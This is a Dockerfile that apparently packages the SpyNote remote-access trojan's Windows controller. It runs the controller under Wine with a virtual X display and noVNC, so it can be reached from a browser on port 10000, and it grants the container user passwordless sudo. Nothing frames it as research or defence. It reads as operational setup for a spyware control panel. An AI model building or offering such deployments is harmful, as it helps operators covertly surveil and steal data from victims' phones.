FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN dpkg --add-architecture i386 && \
    apt-get update && apt-get install -y \
    xvfb x11vnc novnc websockify fluxbox \
    wine32 wine64 winetricks curl gnupg unzip \
    sudo && rm -rf /var/lib/apt/lists/*

# إنشاء مستخدم غير جذر
RUN useradd -m -s /bin/bash wineuser && \
    echo "wineuser ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

WORKDIR /app

COPY SpyNote.zip /app/app.zip
RUN unzip app.zip && rm app.zip

COPY start.sh /app/start.sh
RUN chmod +x /app/start.sh && \
    chown -R wineuser:wineuser /app

USER wineuser
EXPOSE 10000

CMD ["/app/start.sh"]
